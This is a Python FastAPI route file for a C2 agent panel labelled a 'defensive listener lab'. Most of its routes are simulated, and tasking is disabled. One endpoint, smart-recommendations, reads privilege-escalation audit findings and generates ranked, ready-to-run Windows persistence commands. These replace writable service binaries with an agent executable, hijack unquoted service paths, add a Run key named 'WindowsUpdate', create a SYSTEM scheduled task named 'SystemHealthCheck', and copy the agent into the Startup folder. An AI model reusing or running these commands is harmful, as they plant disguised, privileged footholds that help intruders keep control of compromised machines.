"""
Simulated agent routes for the defensive listener lab.
"""
import os
import sys
from typing import List, Optional

from fastapi import APIRouter, Body, HTTPException, Query, status

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.listener_runtime import listener_manager


router = APIRouter(prefix="/api/agents", tags=["agents"])


def _agent_or_404(agent_id: str):
    agent = listener_manager.get_simulated_agent(agent_id)
    if not agent:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=f"Agent {agent_id} not found")
    return agent


@router.get("/", response_model=List[dict])
async def list_agents(
    status: Optional[str] = Query(None),
    listener_id: Optional[str] = Query(None),
):
    return listener_manager.list_simulated_agents(listener_id=listener_id, status=status)


@router.get("/{agent_id}", response_model=dict)
async def get_agent(agent_id: str):
    return _agent_or_404(agent_id)


@router.post("/{agent_id}/tasks")
async def create_task_for_agent(
    agent_id: str,
    command_type: str,
    command_args: Optional[dict] = Body(default=None),
    priority: int = 0,
    operator_id: str = "op_1",
    mitre_technique: Optional[str] = None,
):
    _agent_or_404(agent_id)
    raise HTTPException(
        status_code=status.HTTP_410_GONE,
        detail="Tasking is disabled in defensive simulation mode",
    )


@router.get("/{agent_id}/tasks", response_model=dict)
async def get_agent_tasks(agent_id: str):
    _agent_or_404(agent_id)
    return {
        "tasks": [],
        "total": 0,
        "mode": "defensive-simulation",
        "note": "Tasking is disabled in defensive simulation mode",
    }


@router.post("/{agent_id}/callback")
async def beacon_callback(agent_id: str, payload: dict = Body(default_factory=dict)):
    agent = _agent_or_404(agent_id)
    listener_id = agent.get("listener_id")
    if not listener_id:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Agent has no listener association")

    listener_manager.record_heartbeat(
        listener_id,
        {
            "agent_id": agent_id,
            "hostname": agent.get("hostname"),
            "username": agent.get("username"),
            "process_id": agent.get("process_id"),
            "system_info": agent.get("system_info") or {},
            "agent_version": agent.get("agent_version"),
            "privileges": agent.get("privileges"),
            "operating_system": agent.get("operating_system"),
            "event_type": "callback",
            "signal": "callback",
            "metadata": payload or {},
        },
    )
    return {"status": "acknowledged", "agent_id": agent_id}


@router.delete("/{agent_id}")
async def remove_agent(agent_id: str):
    _agent_or_404(agent_id)
    listener_manager.remove_simulated_agent(agent_id)
    return {"status": "removed", "agent_id": agent_id}

@router.get("/{agent_id}/smart-recommendations")
async def get_smart_recommendations(agent_id: str):
    import sqlite3
    import json
    import os
    
    db_path = '/home/kalilinux/Documents/RED_TOOL/Red_Team_Persistence-main/c2_framework.db'
    
    try:
        # Récupérer l'agent
        agent = listener_manager.get_simulated_agent(agent_id)
        if not agent:
            return {"error": f"Agent {agent_id} not found"}
        
        # Chercher l'audit report dans la base
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Lister les tables
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        audit_data = None
        for table in tables:
            table_name = table[0]
            if 'audit' in table_name.lower() or 'report' in table_name.lower():
                try:
                    cursor.execute(f"SELECT * FROM {table_name} ORDER BY created_at DESC LIMIT 1")
                    row = cursor.fetchone()
                    if row:
                        # Essayer de trouver la colonne JSON
                        cursor.execute(f"PRAGMA table_info({table_name})")
                        columns = [col[1] for col in cursor.fetchall()]
                        for i, col in enumerate(columns):
                            if 'json' in col.lower() or 'data' in col.lower() or 'report' in col.lower():
                                audit_data = json.loads(row[i])
                                break
                        if audit_data:
                            break
                except:
                    pass
        
        conn.close()
        
        # Si pas de données, utiliser des valeurs par défaut
        if not audit_data:
            audit_data = {
                "system": {"IsAdministrator": False, "UserName": "user", "MachineName": "Unknown"},
                "findings": []
            }
        
        system = audit_data.get("system", {})
        findings = audit_data.get("findings", [])
        riskLevel = audit_data.get("riskLevel", "UNKNOWN")
        isAdmin = system.get("IsAdministrator", False)
        username = system.get("UserName", "user")
        hostname = system.get("MachineName", "Unknown")
        osVersion = system.get("OsVersion", "Unknown")
        
        # === ANALYSE DES FINDINGS ===
        writable_services = []
        unquoted_services = []
        
        for finding in findings:
            finding_type = finding.get("type", "")
            if "Writable Service" in finding_type:
                writable_services.append({
                    "name": finding.get("target", "").split("(")[0].strip(),
                    "path": finding.get("evidencePath", ""),
                    "principal": finding.get("principal", "SYSTEM")
                })
            elif "Unquoted Service Path" in finding_type:
                unquoted_services.append({
                    "name": finding.get("target", "").split("(")[0].strip(),
                    "path": finding.get("evidencePath", "")
                })
        
        # === CONSTRUCTION DES RECOMMANDATIONS ===
        recommendations = []
        
        # 1. Services modifiables (CRITICAL) - SCORE 100
        # Technique: service → binary replacement (T1543.003)
        for svc in writable_services[:3]:
            recommendations.append({
                "technique": "service",
                "subtype": "binary_replacement",
                "display": "service → binary replacement",
                "mitre": "T1543.003",
                "score": 100,
                "risk": "critical",
                "reason": f"🎯 CRITICAL: Service '{svc['name']}' is WRITABLE! Runs as {svc['principal']}. Replace the executable for persistence with SYSTEM privileges!",
                "command": f'copy "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" "{svc["path"]}" /Y && net stop "{svc["name"]}" && net start "{svc["name"]}"',
                "privilege_required": "user",
                "recommended": len(recommendations) == 0
            })
        
        # 2. Unquoted service paths (HIGH) - SCORE 95
        # Technique: path hijack → unquoted path (T1574.009)
        for svc in unquoted_services[:3]:
            # Extraire le chemin vulnérable
            path_parts = svc["path"].split("\\")
            vulnerable_path = ""
            for part in path_parts:
                vulnerable_path += part + "\\"
                if " " in part:
                    break
            vulnerable_path = vulnerable_path.rstrip('\\')
            
            recommendations.append({
                "technique": "path_hijack",
                "subtype": "unquoted_path",
                "display": "path hijack → unquoted path",
                "mitre": "T1574.009",
                "score": 95,
                "risk": "high",
                "reason": f"⚠️ Service '{svc['name']}' has unquoted path. Windows will look for: {vulnerable_path}.exe first.",
                "command": f'copy "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" "{vulnerable_path}.exe" /Y && sc stop "{svc["name"]}" && sc start "{svc["name"]}"',
                "privilege_required": "user",
                "recommended": len(recommendations) == 0
            })
        
        # 3. Registry Run Key (MEDIUM) - SCORE 85/75
        # Technique: registry → run key (T1547.001)
        recommendations.append({
            "technique": "registry",
            "subtype": "run_key",
            "display": "registry → run key",
            "mitre": "T1547.001",
            "score": 85 if isAdmin else 75,
            "risk": "medium",
            "reason": f"Registry Run Key - Simple persistence that survives reboots. Works at {'system' if isAdmin else 'user'} level.",
            "command": f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" /f',
            "privilege_required": "user",
            "recommended": len(recommendations) == 0
        })
        
        # 4. Scheduled Task (MEDIUM/LOW) - SCORE 88/65
        # Technique: schtask (T1053.005)
        if isAdmin:
            recommendations.append({
                "technique": "schtask",
                "subtype": "system_level",
                "display": "schtask → system level",
                "mitre": "T1053.005",
                "score": 88,
                "risk": "medium",
                "reason": "Scheduled Task - Runs as SYSTEM, persists even if user logs off.",
                "command": f'schtasks /create /tn "SystemHealthCheck" /tr "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "SYSTEM" /f',
                "privilege_required": "admin",
                "recommended": False
            })
        else:
            recommendations.append({
                "technique": "schtask",
                "subtype": "user_level",
                "display": "schtask → user level",
                "mitre": "T1053.005",
                "score": 65,
                "risk": "low",
                "reason": "Scheduled Task (User level) - Persists when you log in.",
                "command": f'schtasks /create /tn "UserUpdate" /tr "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "{username}" /f',
                "privilege_required": "user",
                "recommended": False
            })
        
        # 5. Startup Folder (LOW) - SCORE 70
        # Technique: startup → folder (T1547.001)
        recommendations.append({
            "technique": "startup",
            "subtype": "folder",
            "display": "startup → folder",
            "mitre": "T1547.001",
            "score": 70,
            "risk": "low",
            "reason": "Startup Folder - Simple but more visible to the user.",
            "command": f'copy "C:\\Users\\{username}\\Desktop\\Agent\\MyAgent.exe" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
            "privilege_required": "user",
            "recommended": False
        })
        
        # Trier par score
        recommendations.sort(key=lambda x: x["score"], reverse=True)
        
        # Marquer le premier comme recommandé
        if recommendations:
            recommendations[0]["recommended"] = True
        
        # Compter les risques
        critical_count = sum(1 for r in recommendations if r["risk"] == "critical")
        high_count = sum(1 for r in recommendations if r["risk"] == "high")
        medium_count = sum(1 for r in recommendations if r["risk"] == "medium")
        low_count = sum(1 for r in recommendations if r["risk"] == "low")
        
        return {
            "summary": {
                "agent": f"{hostname}\\{username}",
                "agent_id": agent_id,
                "is_admin": isAdmin,
                "os_version": osVersion,
                "total_recommendations": len(recommendations),
                "critical_count": critical_count,
                "high_count": high_count,
                "medium_count": medium_count,
                "low_count": low_count,
                "best_technique": recommendations[0]["display"] if recommendations else None,
                "best_score": recommendations[0]["score"] if recommendations else 0,
                "best_mitre": recommendations[0]["mitre"] if recommendations else None
            },
            "recommendations": recommendations
        }
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        return {"error": str(e), "suggestion": "Check audit reports in database"}
        
@router.post("/{agent_id}/update_status")
async def update_agent_status(agent_id: str, new_status: str):
    valid_statuses = ["alive", "dead", "sleeping", "unknown"]
    if new_status not in valid_statuses:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid status. Must be one of {valid_statuses}",
        )

    updated = listener_manager.update_simulated_agent_status(agent_id, new_status)
    if not updated:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=f"Agent {agent_id} not found")
    return {"status": "updated", "agent_id": agent_id, "new_status": new_status}
